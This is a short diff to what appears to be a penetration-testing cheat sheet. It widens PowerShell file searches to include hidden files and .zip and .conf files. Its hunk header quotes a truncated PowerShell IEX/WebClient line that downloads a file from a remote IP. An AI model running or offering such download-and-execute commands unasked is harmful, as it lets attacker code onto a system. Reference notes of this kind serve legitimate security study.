@@ -498,7 +498,8 @@ powershell -c "IEX(New-Object System.Net.WebClient).DownloadFile('http://192.168
 find specific files
 
 ```powershell
-Get-ChildItem -Path "C:\Folder" -Recurse -Filter "*.txt"
+Get-ChildItem -Path "C:\Folder" -Recurse -Force -Filter "*.txt"
+Get-ChildItem -Path "C:\Folder" -Recurse -Force -Include "*.txt","*.zip","*.conf"
 ```
 
 ### :open_file_folder: Firefox
